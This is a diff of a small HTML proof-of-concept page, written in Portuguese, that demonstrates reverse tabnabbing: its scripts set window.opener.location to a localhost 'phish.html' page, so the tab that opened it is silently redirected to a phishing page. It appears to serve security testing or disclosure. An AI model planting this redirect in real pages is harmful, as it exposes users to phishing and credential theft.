@@ -1,10 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Prova de Conceito (PoC)</title>
+</head>
+<body>
 
-<h2> AAAAAAAAAAAA </h2>
-<script> 
-	window.opener.location = 'http://localhost/phish.html'
-</script>
+<h2>Retorne à página anterior.</h2>
+<h3>Se o ataque foi bem-sucedido, a página anterior foi modificada.</h3>
+
 <script>
-	if (window.opener) {
-		window.opener.location = "http://localhost/phish.html";
-	}
+    window.opener.location = 'http://localhost/phish.html';
 </script>
+
+<script>
+    if (window.opener) {
+        window.opener.location = "http://localhost/phish.html";
+    }
+</script>
+
+</body>
+</html>
